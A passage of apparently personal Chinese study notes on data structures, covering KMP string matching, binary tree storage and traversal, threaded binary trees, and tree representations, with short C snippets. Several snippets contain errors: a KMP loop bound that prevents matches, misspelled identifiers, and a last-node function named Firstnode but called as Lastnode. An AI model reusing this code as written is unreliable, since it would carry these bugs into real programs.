class="line">i=i-j+<span class="number">2</span>;</span><br><span class="line">j=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j&gt;T.length)&#123;</span><br><span class="line"><span class="keyword">return</span> i-T.length;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>最坏时间复杂度O(nm)<br>最好时间复杂度O(m)或O(1)</p><h2 id="4-4-KMP算法"><a href="#4-4-KMP算法" class="headerlink" title="4.4 KMP算法"></a>4.4 KMP算法</h2><p>不匹配的字符之前,一定是和模式串一致的<br>对于模式串T = ‘abaabc’<br>当<mark>第6个</mark>元素匹配失败时，可令主串指针<mark>i不变</mark>，模式串指针<mark>j=3</mark><br>当<mark>第5个</mark>元素匹配失败时，可令主串指针<mark>i不变</mark>，模式串指针<mark>j=2</mark><br>当<mark>第4个</mark>元素匹配失败时，可令主串指针<mark>i不变</mark>，模式串指针<mark>j=2</mark><br>当<mark>第3个</mark>元素匹配失败时，可令主串指针<mark>i不变</mark>，模式串指针<mark>j=1</mark><br>当<mark>第2个</mark>元素匹配失败时，可令主串指针<mark>i不变</mark>，模式串指针<mark>j=1</mark><br>当<mark>第1个</mark>元素匹配失败时，匹配下-个相邻子串，令<mark>j=0, i++, j++</mark><br>引入next数组来定位j去改变j的值</p><p>算法思路:根据模式串T,求出next数组 =&gt; 利用next数组进行匹配(主串指针不回溯)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index_KMP</span><span class="params">(SString S,SString T,<span class="type">int</span> next[])</span>&#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">1</span>,j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=S.length&amp;&amp;j&lt;T.length)&#123;</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>||S.ch[i]==T.ch[j])&#123;</span><br><span class="line">++i;</span><br><span class="line">++j;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">j=next[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j&gt;T.length)&#123;</span><br><span class="line"><span class="keyword">return</span> i-T.length;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最坏时间复杂度O(m+n)<br>其中,求next数组时间复杂度O(m)</p><h2 id="4-5-求next数组"><a href="#4-5-求next数组" class="headerlink" title="4.5 求next数组"></a>4.5 求next数组</h2><p>任何模式串都一样<br>第一个字符不匹配时,只能匹配下一个子串,因此,往后余生,<mark>next[1]都无脑写0</mark><br>第二个字符不匹配时,应尝试匹配模式串的第2个字符,因此,往后余生,<mark>next[2]都无脑写1</mark><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/3732151190959.gif" alt="4"></p><h1 id="5-二叉树"><a href="#5-二叉树" class="headerlink" title="5.二叉树"></a>5.二叉树</h1><h2 id="5-5-二叉树的存储结构"><a href="#5-5-二叉树的存储结构" class="headerlink" title="5.5 二叉树的存储结构"></a>5.5 二叉树的存储结构</h2><h3 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">ElemType value;</span><br><span class="line"><span class="type">bool</span> isEmpty;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">TreeNode t[MaxSize];</span><br></pre></td></tr></table></figure><p>结论:二叉树的顺序存储结构，只适合存储完全二叉树</p><h3 id="链式存储"><a href="#链式存储" class="headerlink" title="链式存储"></a>链式存储</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ElemType</span>&#123;</span></span><br><span class="line"><span class="type">int</span> value;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"></span><br><span class="line">BiTree root=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">root =(BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">root-&gt;data=&#123;<span class="number">1</span>&#125;;</span><br><span class="line">root-&gt;lchild=<span class="literal">NULL</span>;</span><br><span class="line">root-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BiTNode *p=(BiTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">p-&gt;data=&#123;<span class="number">2</span>&#125;;</span><br><span class="line">p-&gt;lchild=<span class="literal">NULL</span>;</span><br><span class="line">p-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">root-&gt;lchild=p; </span><br></pre></td></tr></table></figure><p>n个结点的二叉链表共有n+1个空链域</p><h2 id="5-6-二叉树的先中后序遍历"><a href="#5-6-二叉树的先中后序遍历" class="headerlink" title="5.6 二叉树的先中后序遍历"></a>5.6 二叉树的先中后序遍历</h2><p>先序遍历:根左右(NLR)<br>中序遍历左根右(LNR)<br>后序遍历:左右根(LRN)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先序遍历 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">visit(T);</span><br><span class="line">PreOrder(T-&gt;Lchild);</span><br><span class="line">preOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">InOrder(T-&gt;Lchild);</span><br><span class="line">visit(T);</span><br><span class="line">InOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">PostOrder(T-&gt;Lchild);</span><br><span class="line">PostOrder(T-&gt;rchild);</span><br><span class="line">visit(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>O(n)</p><h2 id="5-7-二叉树的层次遍历"><a href="#5-7-二叉树的层次遍历" class="headerlink" title="5.7 二叉树的层次遍历"></a>5.7 二叉树的层次遍历</h2><p>算法思想:<br>1.初始化一个辅助队列<br>2.根节点入队<br>3.若队列非空，则队头结点出队，访问该结点，并将其左,右孩子插入队尾(如果有的话)<br>4.重复3直至队列为空<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二叉树的结点(链式存储) </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line"><span class="type">char</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链式队列结点 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">BiTNode * data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">LinkNode *front,*rear; <span class="comment">//队头,队尾 </span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">LinkQueue Q;</span><br><span class="line">InitQueue(Q);</span><br><span class="line">BiTree p;</span><br><span class="line">EnQueue(Q,T);     <span class="comment">//将根结点入队 </span></span><br><span class="line"><span class="keyword">while</span>(!isEmpty(Q))&#123;   <span class="comment">//队列不空则循环 </span></span><br><span class="line">DeQueue(Q,p);     <span class="comment">//队头结点出队 </span></span><br><span class="line">visit(p);             <span class="comment">//访问出队结点 </span></span><br><span class="line"><span class="keyword">if</span>(p-&gt;lchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">EnQueQue(Q,p-&gt;lchild);   <span class="comment">//左孩子入队 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;rchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">EnQueue(Q,p-&gt;rchild);   <span class="comment">//右孩子入队 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p><h2 id="5-8-由遍历序列构造二叉树"><a href="#5-8-由遍历序列构造二叉树" class="headerlink" title="5.8 由遍历序列构造二叉树"></a>5.8 由遍历序列构造二叉树</h2><p>结论:若只给出一棵二叉树的前/中/后/层 序遍历序列中的一种，不能唯一确定一棵二叉树</p><p>可以确定的二叉树:<br>前序+中序遍历序列:<br>-&gt;根节点从前往后分析<br>后序+中序遍历序列:<br>-&gt;根节点从后往前分析<br>层序+中序遍历序列:<br>-&gt;根节点 左子树的根 右子树的根</p><h2 id="5-9-线索二叉树的概念"><a href="#5-9-线索二叉树的概念" class="headerlink" title="5.9 线索二叉树的概念"></a>5.9 线索二叉树的概念</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line"><span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;ThreadNode,*ThreadTree; </span><br></pre></td></tr></table></figure><p>tag==0,表示指针指向孩子<br>tag==1，表示指针是”线索”<br>n个结点的二叉树，有n+1个空链域!可用来记录前驱，后继的信息</p><h2 id="5-10-二叉树的线索化"><a href="#5-10-二叉树的线索化" class="headerlink" title="5.10 二叉树的线索化"></a>5.10 二叉树的线索化</h2><h3 id="中序线索化"><a href="#中序线索化" class="headerlink" title="中序线索化"></a>中序线索化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用土办法找中序前驱</span></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">InOrder(T-&gt;lchild);</span><br><span class="line">visit(T);</span><br><span class="line">InOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(BiTNode * q)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(q==p)&#123;</span><br><span class="line">final = pre;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">pre=q;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">BiTNode *p;</span><br><span class="line">BiTNode * pre=<span class="literal">NULL</span>;</span><br><span class="line">BiTNode * final=<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line"><span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;ThreadNode,* ThreadTree;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">InThread(T-&gt;lchild);</span><br><span class="line">visit(T);</span><br><span class="line">InTread(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vist</span><span class="params">(ThreadNode *q)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(q-&gt;lchild==<span class="literal">NULL</span>)&#123;</span><br><span class="line">q-&gt;lchild=pre;</span><br><span class="line">q-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pre!=<span class="literal">NULL</span>&amp;&amp;pre-&gt;rchild==<span class="literal">NULL</span>)&#123;</span><br><span class="line">pre-&gt;rchild=q;</span><br><span class="line">pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pre=q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateInThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">pre=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">InThread(T);</span><br><span class="line"><span class="keyword">if</span>(pre-&gt;rchild==<span class="literal">NULL</span>)&#123;</span><br><span class="line">pre-&gt;rtag=<span class="number">1</span>;   <span class="comment">//处理最后一个结点 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ThreadNode *pre=<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="先序线索化"><a href="#先序线索化" class="headerlink" title="先序线索化"></a>先序线索化</h3><p>防止循环问题<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">visit(T);</span><br><span class="line"><span class="keyword">if</span>(T-&gt;ltag==<span class="number">0</span>)&#123; <span class="comment">//lchild不是前驱线索</span></span><br><span class="line">PreThread(T-&gt;lchild); </span><br><span class="line">&#125; </span><br><span class="line">PreThread(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="后序线索化"><a href="#后序线索化" class="headerlink" title="后序线索化"></a>后序线索化</h3><p>不会出现循环问题<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">PostThread(T-&gt;lchild);</span><br><span class="line">PostThread(T-&gt;rchild);</span><br><span class="line">visit(T);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="5-11-在线索二叉树中找前驱后继"><a href="#5-11-在线索二叉树中找前驱后继" class="headerlink" title="5.11 在线索二叉树中找前驱后继"></a>5.11 在线索二叉树中找前驱后继</h2><h3 id="中序线索二叉树中找中序后继"><a href="#中序线索二叉树中找中序后继" class="headerlink" title="中序线索二叉树中找中序后继"></a>中序线索二叉树中找中序后继</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//找到以P为根的子树中，第一个被中序遍历的结点</span></span><br><span class="line">ThreadNode *<span class="title function_">Firstnode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>) p=p-&gt;lchild;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; </span><br><span class="line"> <span class="comment">//在中序线索二叉树中找到结点P的后继结点 </span></span><br><span class="line">ThreadNode *<span class="title function_">Nextnode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;rtag==<span class="number">0</span>) <span class="keyword">return</span> Firstnode(p-&gt;rchild);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对中序线索二叉树进行中序遍历(利用线索实现的非递归算法)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Inorder</span><span class="params">(ThreadNode *T)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(ThreadNode *p=Firstnode(T);p!=<span class="literal">NULL</span>;p=Nextnode(p))&#123;</span><br><span class="line">visit(p);</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>O(1)</p><h3 id="中序线索二叉树中找中序前驱"><a href="#中序线索二叉树中找中序前驱" class="headerlink" title="中序线索二叉树中找中序前驱"></a>中序线索二叉树中找中序前驱</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//找到以P为根的子树中，最后一个被中序遍历的结点</span></span><br><span class="line">ThreadNode *<span class="title function_">Firstnode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;rtag==<span class="number">0</span>) p=p-&gt;rchild;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; </span><br><span class="line"> <span class="comment">//在中序线索二叉树中找到结点P的前继结点 </span></span><br><span class="line">ThreadNode *<span class="title function_">Prenode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;ltag==<span class="number">0</span>) <span class="keyword">return</span> Lastnode(p-&gt;lchild);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> p-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对中序线索二叉树进行逆向中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RevInorder</span><span class="params">(ThreadNode *T)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(ThreadNode *p=Lastnode(T);p!=<span class="literal">NULL</span>;p=Prenode(p))&#123;</span><br><span class="line">visit(p);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/1919921201051.png" alt=""></p><h2 id="5-12-树的存储结构"><a href="#5-12-树的存储结构" class="headerlink" title="5.12 树的存储结构"></a>5.12 树的存储结构</h2><h3 id="双亲表示法-顺序存储"><a href="#双亲表示法-顺序存储" class="headerlink" title="双亲表示法(顺序存储)"></a>双亲表示法(顺序存储)</h3><p>每个结点中保存指向双亲的”指针”<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">PTNode nodes[Max_TREE_SIZE];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">&#125;PTree;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>优点:查指定结点的双亲很方便<br>缺点:空数据导致遍历更慢，查指定结点的孩子只能从头遍历</p><h3 id="孩子表示法-顺序＋链式存储"><a href="#孩子表示法-顺序＋链式存储" class="headerlink" title="孩子表示法(顺序＋链式存储)"></a>孩子表示法(顺序＋链式存储)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span>&#123;</span></span><br><span class="line"><span class="type">int</span> child;  <span class="comment">//孩子结点在数组中位置</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">next</span>;</span> <span class="comment">//下一个孩子</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ELemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">firstChild</span>;</span> <span class="comment">//第一个孩子</span></span><br><span class="line">&#125;CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">CTBox nodes[MAX_TREE_SIZE];</span><br><span class="line"><span class="type">int</span> n,r; <span class="comment">//结点数和根的位置</span></span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><h3 id="孩子兄弟表示法-链式存储"><a href="#孩子兄弟表示法-链式存储" class="headerlink" title="孩子兄弟表示法(链式存储)"></a>孩子兄弟表示法(链式存储)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//树的存储--孩子兄弟表示法</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">nextsibling</span>;</span></span><br><span class="line">&#125;CSNode,*CSTree; </span><br></pre></td></tr></table></figure><h4 id="树和二叉树的转化"><a href="#树和二叉树的转化" class="headerlink" title="树和二叉树的转化"></a>树和二叉树的转化</h4><p>树转二叉树<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/652348219477.png" alt=""><br>二叉树转树<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/267049207344.png" alt=""><br><mark>森林和二叉树的转化</mark><br>森林转二叉树<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/5036050227510.png" alt=""><br>二叉树转森林<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/4339851220179.png" alt=""></p><h2 id="5-13-树和森林的遍历"><a href="#5-13-树和森林的遍历" class="headerlink" title="5.13 树和森林的遍历"></a>5.13 树和森林的遍历</h2><h3 id="树的先根遍历"><a href="#树的先根遍历" class="headerlink" title="树的先根遍历"></a>树的先根遍历</h3><p>若树非空，先访问根结点，再依次对每根子树进行先根遍历。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(TreeNode *R)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(R!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">visit(R);</span><br><span class="line"><span class="keyword">while</span>(R还有下一个子树T)&#123;</span><br><span class="line">PreOrder(T);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>利用孩子兄弟表示法转化为二叉树<br><mark>树的先根遍历序列与这棵树相应二叉树的先序序列相同</mark></p><h3 id="树的后根遍历"><a href="#树的后根遍历" class="headerlink" 